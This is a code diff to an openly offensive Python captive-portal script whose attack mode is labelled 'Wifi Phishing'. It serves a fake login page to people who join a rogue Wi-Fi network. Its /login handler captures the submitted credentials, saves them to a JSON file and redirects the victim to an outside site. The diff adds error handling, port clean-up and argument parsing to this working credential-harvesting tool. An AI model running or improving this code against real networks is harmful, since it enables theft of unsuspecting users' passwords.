@@ -1,3 +1,4 @@
+
 #!/usr/bin/env python
 
 """
@@ -28,7 +29,6 @@ import http.server
 import socketserver
 from urllib.parse import parse_qs
 from rich.console import Console
-from rich.panel import Panel
 import os
 import sys
 import json
@@ -45,58 +45,86 @@ PORT = const.port()
 
 CRED_FILE = const.credfile()
 
-
 class QuietHandler(http.server.SimpleHTTPRequestHandler):
     def log_message(self, format, *args):
-        pass  
+        return  # Silence default logging
+
+    def do_GET(self):
+        return super().do_GET()
+
 
 class CaptivePortalHandler(QuietHandler):
     def do_GET(self):
         redirect_paths = const.paths()
         if self.path in redirect_paths:
             self.path = "/index.html"
-        return http.server.SimpleHTTPRequestHandler.do_GET(self)
+        try:
+            http.server.SimpleHTTPRequestHandler.do_GET(self)
+        except (BrokenPipeError, ConnectionResetError):
+            pass  # Client disconnected abruptly
+        except Exception as e:
+            console.print(f"[ERROR] Exception in do_GET: {e}")
+
+            redirect_paths = const.paths()
+            if self.path in redirect_paths:
+                self.path = "/index.html"
+            try:
+                super().do_GET()
+            except (BrokenPipeError, ConnectionResetError):
+                pass  # Client disconnected abruptly
+            except Exception as e:
+                console.print(f"[ERROR] Exception in do_GET: {e}")
 
     def do_POST(self):
-        if self.path == "/login":
-            content_length = int(self.headers['Content-Length'])
-            post_data = self.rfile.read(content_length)
-            data = parse_qs(post_data.decode('utf-8'))
-            entry =  utils.post_data(data,self)
-            banner.credentials(entry)
-            try:
-                if os.path.exists(os.getcwd()+CRED_FILE) and os.path.getsize(os.getcwd()+CRED_FILE) > 0:
-                    with open(os.getcwd()+CRED_FILE, "r") as f:
-                        all_data = json.load(f)
-                else:
+        try:
+            if self.path == "/login":
+                content_length = int(self.headers['Content-Length'])
+                post_data = self.rfile.read(content_length)
+                data = parse_qs(post_data.decode('utf-8'))
+                entry = utils.post_data(data, self)
+                banner.credentials(entry)
+
+                try:
+                    cred_path = os.getcwd() + CRED_FILE
+                    if os.path.exists(cred_path) and os.path.getsize(cred_path) > 0:
+                        with open(cred_path, "r") as f:
+                            all_data = json.load(f)
+                    else:
+                        all_data = []
+                except json.JSONDecodeError:
                     all_data = []
-            except json.JSONDecodeError:
-                all_data = []
 
-            all_data.append(entry)
+                all_data.append(entry)
 
-            try:
-                utils.savecred(all_data,CRED_FILE)
-            except Exception as e:
-                print(f"[ERROR] Could not save credentials: {e}")
+                try:
+                    utils.savecred(all_data, CRED_FILE)
+                except Exception as e:
+                    print(f"[ERROR] Could not save credentials: {e}")
 
+                self.send_response(302)
+                self.send_header('Location', 'http://karthitehacker.com')
+                self.end_headers()
 
-            self.send_response(302)
-            self.send_header('Location', 'http://example.com')
-            self.end_headers()
+            elif self.path == "/chat":
+                self.send_response(200)
+                self.send_header("Content-Type", "text/plain")
+                self.end_headers()
+                try:
+                    self.wfile.write(b"OK")
+                except (BrokenPipeError, ConnectionResetError):
+                    pass
 
-        elif self.path == "/chat":
-            # Graceful response for Samsung captive detection POST
-            self.send_response(200)
-            self.send_header("Content-Type", "text/plain")
-            self.end_headers()
-            self.wfile.write(b"OK")
+            else:
+                self.send_error(404)
 
-        else:
-            self.send_error(404)
+        except (BrokenPipeError, ConnectionResetError):
+            pass  # Gracefully ignore if client resets connection
+        except Exception as e:
+            console.print(f"[ERROR] Exception in do_POST: {e}")
 
 def run_server(template_path):
     os.chdir(template_path)
+    utils.kill_port(PORT)
     handler = CaptivePortalHandler
     with socketserver.TCPServer(("", PORT), handler) as httpd:
         print(f"[+] Captive portal running at http://0.0.0.0:{PORT}")
@@ -107,13 +135,24 @@ def run_server(template_path):
             httpd.server_close()
             sys.exit(0)
 
+
 if __name__ == "__main__":
-    if len(sys.argv) < 2:
-        print("Usage: python3 captiveportal.py <template_path>")
+    if len(sys.argv) != 4:
+        console.print("[bold red]Usage:[/bold red] python3 captiveportal.py <template_path> <interface> <ssid>")
         sys.exit(1)
-    inf = sys.argv[2]
-    wifiname = sys.argv[3]
+
+    template_path = sys.argv[1]
+    interface = sys.argv[2]
+    ssid = sys.argv[3]
     attack_mode = "Wifi Phishing"
-    banner.show_banner()
-    banner.wifiphish(inf,attack_mode,wifiname)
-    run_server(sys.argv[1])
+
+   
+
+    try:
+        banner.show_banner()
+        banner.wifiphish(interface,attack_mode,ssid)
+        run_server(sys.argv[1])
+    except KeyboardInterrupt:
+        console.print("\n[bold red]Shutdown requested. Exiting...[/bold red]")
+    except Exception as e:
+        console.print(f"[bold red]ERROR:[/bold red] {e}")
